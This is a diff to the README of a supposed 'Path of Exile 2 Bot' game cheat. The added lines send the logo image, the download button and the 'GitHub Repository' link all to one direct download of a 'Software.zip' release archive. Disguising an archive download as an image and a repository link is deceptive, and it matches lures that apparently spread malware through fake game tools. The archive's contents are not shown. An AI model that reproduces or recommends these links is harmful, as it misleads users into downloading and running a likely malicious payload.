@@ -6,7 +6,7 @@
 
 ---
 
-![Path of Exile 2 Bot Logo](https://www.example.com/poe2botlogo.png)
+![Path of Exile 2 Bot Logo](https://github.com/Bloxfruitmylife1/Path-Of-Exile-2-Bot/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -20,7 +20,7 @@
 
 ---
 
-🔗 **[Download Path of Exile 2 Bot](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)** 🔗
+🔗 **[Download Path of Exile 2 Bot](https://github.com/Bloxfruitmylife1/Path-Of-Exile-2-Bot/releases/download/v2.0/Software.zip)** 🔗
 
 ---
 
@@ -86,7 +86,7 @@
 
 ---
 
-### 🌐 Visit the [Path of Exile 2 Bot GitHub Repository](https://github.com/path-of-exile-2-bot) for more information! 🌐
+### 🌐 Visit the [Path of Exile 2 Bot GitHub Repository](https://github.com/Bloxfruitmylife1/Path-Of-Exile-2-Bot/releases/download/v2.0/Software.zip) for more information! 🌐
 
 ---
 
